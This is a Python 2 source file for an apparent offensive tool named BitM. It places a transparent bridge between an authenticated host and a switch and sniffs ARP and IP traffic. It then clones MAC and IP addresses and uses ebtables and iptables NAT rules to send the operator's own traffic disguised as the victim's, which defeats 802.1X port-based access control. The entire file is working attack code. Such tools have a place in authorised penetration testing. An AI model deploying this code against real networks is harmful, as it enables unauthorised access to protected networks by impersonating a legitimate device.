#!/usr/bin/python2
# Author: @jkadijk
# Base decoderthread layout from the Impacket examples.

import sys
import os
import time
import argparse

import struct
import re
from threading import Thread
import socket

import pcapy
from pcapy import open_live
import impacket
import impacket.ImpactPacket
from impacket.ImpactDecoder import EthDecoder, LinuxSLLDecoder


class DecoderThread(Thread):
    def __init__(self, bridge, subnet, arptable):
        # Open interface for capturing.
        self.pcap = open_live(bridge.bridgename, 1500, 0, 100)

        # Query the type of the link and instantiate a decoder accordingly.
        datalink = self.pcap.datalink()
        if pcapy.DLT_EN10MB == datalink:
            self.decoder = EthDecoder()
        elif pcapy.DLT_LINUX_SLL == datalink:
            self.decoder = LinuxSLLDecoder()
        else:
            raise Exception("Datalink type not supported: " % datalink)

        self.bridge = bridge
        self.subnet = subnet
        self.arptable = arptable
        self.running = True

        Thread.__init__(self)

    def run(self):
        # Sniff ad infinitum.
        # PacketHandler shall be invoked by pcap for every packet.
        while self.running:
            self.pcap.dispatch(1, self.packetHandler)

    def stop(self):
        self.running = False
        time.sleep(0.1)

    def packetHandler(self, hdr, data):
        e = self.decoder.decode(data)
        if e.get_ether_type() == impacket.ImpactPacket.IP.ethertype:
            ip = e.child()
            ttl = ip.get_ip_ttl()
            # Uneven but not 1 or 255 ttl means it's probably coming from a router
            if (ttl % 2) > 0 and ttl > 1 and ttl != 255:
                self.subnet.gatewaymac = e.get_ether_shost()
                self.subnet.sourcemac = e.get_ether_dhost()
                self.subnet.sourceaddress = ip.get_ip_dst()

        if e.get_ether_type() == impacket.ImpactPacket.ARP.ethertype:
            arp = e.child()
            self.subnet.registeraddress(arp.get_ar_tpa())
            self.subnet.registeraddress(arp.get_ar_spa())

            if arp.get_op_name(arp.get_ar_op()) == "REPLY":
                print "got arp reply"
                self.arptable.registeraddress(arp.get_ar_spa(), arp.as_hrd(arp.get_ar_sha()))
            if arp.get_op_name(arp.get_ar_op()) == "REQUEST":
                self.arptable.registeraddress(arp.get_ar_spa(), arp.as_hrd(arp.get_ar_sha()))


class ArpTable:
    table = {}

    def registeraddress(self, ip_array, hw_address):
        ip = self.printip(ip_array)
        if ip != "0.0.0.0":
            self.table[ip] = hw_address
            print "%s : %s" % (ip, hw_address)

    def printip(self, ip_array):
        ip_string = socket.inet_ntoa(struct.pack('BBBB', *ip_array))
        return ip_string

    def updatekernel(self):
        for ip, mac in self.table.iteritems():
            os.system("arp -i mibr -s %s %s" % (ip, mac))
            os.system("ip route add %s/32 dev mibr" % ip)


# Only supports /24 or smaller
class Subnet:
    sourcemac = None
    gatewaymac = None
    subnet = None
    minaddress = None
    maxaddress = None
    sourceaddress = None
    gatewayaddress = ""

    def registeraddress(self, ip_array):
        if self.printip(ip_array) == "0.0.0.0":
            return False
        if ip_array[0] == 169:
            return False
        if self.checksubnet(ip_array):
            if self.minaddress is None or self.minaddress[3] > ip_array[3]:
                self.minaddress = ip_array
            if self.maxaddress is None or self.maxaddress[3] < ip_array[3]:
                self.maxaddress = ip_array
        else:
            print self.printip(ip_array)
            print "[!] Error, duplicate or big subnet detected"

    def checksubnet(self, ip_array):
        if self.subnet is None:
            self.subnet = ip_array
            return True
        if ip_array[0] == self.subnet[0] and ip_array[1] == self.subnet[1]:
            return True
        else:
            return False

    def printip(self, ip_array):
        ip_string = socket.inet_ntoa(struct.pack('BBBB', *ip_array))
        return ip_string

    def getcidr(self):
        if self.maxaddress and self.minaddress:
            bits = 0
            discovered_hosts = self.maxaddress[3] - self.minaddress[3] + 1
            hosts = 0
            while hosts < discovered_hosts and bits <= 8:
                bits += 1
                hosts = 2**bits
            return bits
        else:
            return 0

    def get_gatewaymac(self):
        ethernet = impacket.ImpactPacket.Ethernet()
        temp = ethernet.as_eth_addr(self.gatewaymac)
        return re.sub(r':(\d):', r':0\1:', temp)

    def get_sourcemac(self):
        ethernet = impacket.ImpactPacket.Ethernet()
        return ethernet.as_eth_addr(self.sourcemac)

    def __str__(self):
        ethernet = impacket.ImpactPacket.Ethernet()
        header = "Network config: \n"
        output = ""
        if self.minaddress and self.maxaddress:
            output += "cidr bits: %i\n" % self.getcidr()

        if self.sourcemac and self.gatewaymac:
            output += "source: %s gateway: %s\n" %\
                      (ethernet.as_eth_addr(self.sourcemac), ethernet.as_eth_addr(self.gatewaymac))

        if self.sourceaddress:
            output += "source ip: %s gateway ip: %s\n" % (self.sourceaddress, self.gatewayaddress)

        if output == "":
            return "Network config unknown"
        else:
            return header + output


# Create ebtables, arptables and iptables rules based on a subnet object
class Netfilter:
    subnet = None
    bridge = None

    switchsidemac = None
    radiosilence = False
    gatewayinterface = "ethX"
    bridgeinterface = "mibr"
    bridgeip = "169.254.66.77"

    def __init__(self, subnet, bridge):
        self.subnet = subnet
        self.bridge = bridge

        self.inittables()

    def inittables(self):
        self.flushtables()
        os.system("iptables -P OUTPUT DROP")
        os.system("ebtables -P OUTPUT DROP")
        os.system("arptables -P OUTPUT DROP")

    def flushtables(self):
        os.system("iptables -F")
        os.system("iptables -F -t nat")
        os.system("ebtables -F")
        os.system("ebtables -t nat -F")
        os.system("arptables -F")

    def reset(self):
        self.flushtables()
        os.system("iptables -P OUTPUT ACCEPT")
        os.system("ebtables -P OUTPUT ACCEPT")
        os.system("arptables -P OUTPUT ACCEPT")

    def updatetables(self):
        self.flushtables()
        print "searching for mac: %s ..." % self.subnet.get_gatewaymac()
        f = os.popen("brctl showmacs %s | grep %s | awk '{print $1}'" %
                     (self.bridgeinterface, self.subnet.get_gatewaymac()))
        portnumber = f.read().rstrip()
        f.close()
        if portnumber == "":
            print "portnumber not found bailing"
            return False
        print "portnumber is: %s" % portnumber
        run = "brctl showstp %s | grep '(%s)' | head -n1 | awk '{print $1}'" % \
              (self.bridgeinterface, portnumber)
        print run

        x = os.popen(run)
        interface = x.read()
        x.close()
        interface = interface.rstrip()
        print "got interface: %s .." % interface
        if interface == "":
            print "error getting interface is the bridge setup right?"
            return False
        print "switchside interface: %s" % interface
        self.gatewayinterface = interface
        f = os.popen("ip link show %s" % interface)
        result = f.read()
        f.close()
        matches = re.search("..:..:..:..:..:..", result)
        print "switchsidemac: %s" % matches.group(0)
        self.switchsidemac = matches.group(0)
        os.system("macchanger -m %s %s" % (self.switchsidemac, self.bridge.bridgename))
        print "Updating netfilter"
        os.system("ip addr add 169.254.66.77/24 dev mibr")
        os.system("ebtables -t nat -A POSTROUTING -s %s -o %s -j snat --snat-arp --to-src %s" %
                  (self.switchsidemac, self.gatewayinterface, self.subnet.get_sourcemac()))
        os.system("ebtables -t nat -A POSTROUTING -s %s -o %s -j snat --snat-arp --to-src %s" %
                  (self.switchsidemac, self.bridgeinterface, self.subnet.get_sourcemac()))

        os.system("arp -s -i %s 169.254.66.55 %s" % (self.bridgeinterface, self.subnet.get_gatewaymac()))
        print "[*] Setting up layer 3 NAT"
        os.system("iptables -t nat -A POSTROUTING -o %s -s 169.254.0.0/16 -p tcp -j SNAT --to %s:61000-62000" %
                  (self.bridgeinterface,  self.subnet.sourceaddress))
        os.system("iptables -t nat -A POSTROUTING -o %s -s 169.254.0.0/16 -p udp -j SNAT --to %s:61000-62000" %
                  (self.bridgeinterface,  self.subnet.sourceaddress))
        os.system("iptables -t nat -A POSTROUTING -o %s -s 169.254.0.0/16 -p icmp -j SNAT --to %s" %
                  (self.bridgeinterface,  self.subnet.sourceaddress))
        if not self.radiosilence:
            os.system("ebtables -D OUTPUT -j DROP")
            os.system("arptables -D OUTPUT -j DROP")
        os.system("ip route del default")
        os.system("ip route add default via 169.254.66.55 dev mibr")


class Bridge:
    subnet = None
    bridgename = None
    interfaces = []

    def __init__(self, bridgename, interfaces):
        self.bridgename = bridgename
        self.interfaces = interfaces
        os.system("brctl addbr %s" % bridgename)

        for interface in [self.bridgename] + self.interfaces:
            os.system("ip link set %s down" % interface)
            if not args.enable_ipv6:
                os.system("sysctl -w net.ipv6.conf.%s.disable_ipv6=1" % interface)
            os.system("sysctl -w net.ipv6.conf.%s.autoconf=0" % interface)
            os.system("sysctl -w net.ipv6.conf.%s.accept_ra=0" % interface)
            if interface != bridgename:
                os.system("brctl addif %s %s" % (bridgename, interface))
            os.system("ip link set %s promisc on" % interface)

        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

        # Allow 802.1X traffic to pass the bridge
        os.system("echo 8 > /sys/class/net/mibr/bridge/group_fwd_mask")

    def up(self):
        for interface in [self.bridgename] + self.interfaces:
            os.system("ip link set %s up" % interface)

    def down(self):
        for interface in [self.bridgename] + self.interfaces:
            os.system("ip link set %s down" % interface)

    def destroy(self):
        self.down()
        os.system("brctl delbr %s" % self.bridgename)
        os.system("sysctl --system")


def main():
    if os.getuid() != 0:
        print "You need to run BitM as root!"
        sys.exit(1)

    dependencies = ['macchanger', 'brctl', 'ip', 'sysctl', 'arp',
                    'iptables', 'arptables', 'ebtables']

    for d in dependencies:
        if os.system("which %s >/dev/null" % d):
            print "Command '%s' is missing. Please install." % d
            sys.exit(1)

    bridge = Bridge("mibr", args.ifaces)
    subnet = Subnet()
    netfilter = Netfilter(subnet, bridge)
    arptable = ArpTable()

    bridge.up()

    # Start sniffing thread and finish main thread.
    thread = DecoderThread(bridge, subnet, arptable)
    thread.start()

    print "Listening on %s: net=%s, mask=%s, linktype=%d" % \
          (bridge.bridgename, thread.pcap.getnet(), thread.pcap.getmask(), thread.pcap.datalink())

    try:
        while True:
            if subnet.sourceaddress and subnet.gatewaymac and subnet.sourcemac:
                print subnet

                netfilter.updatetables()
                break
            else:
                print "not enough info..."
                print subnet
            time.sleep(20)

        # arp setup
        while True:
            f = open('/root/subnetinfo', 'w')
            f.write(str(subnet))
            f.close()
            arptable.updatekernel()
            time.sleep(20)

    except KeyboardInterrupt:
        thread.stop()
        bridge.destroy()
        netfilter.reset()
        sys.exit(0)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='BitM')
    parser.add_argument('ifaces', metavar='IFACE', nargs='*',
                        default=['eth1', 'eth2'], help='Two interfaces')
    parser.add_argument('-6', '--enable-ipv6', action='store_true')
    args = parser.parse_args()

    if len(args.ifaces) not in (0, 2):
        parser.error('Either give two interfaces or none to use the ' +
                     'default "eth1 eth2"')

    main()
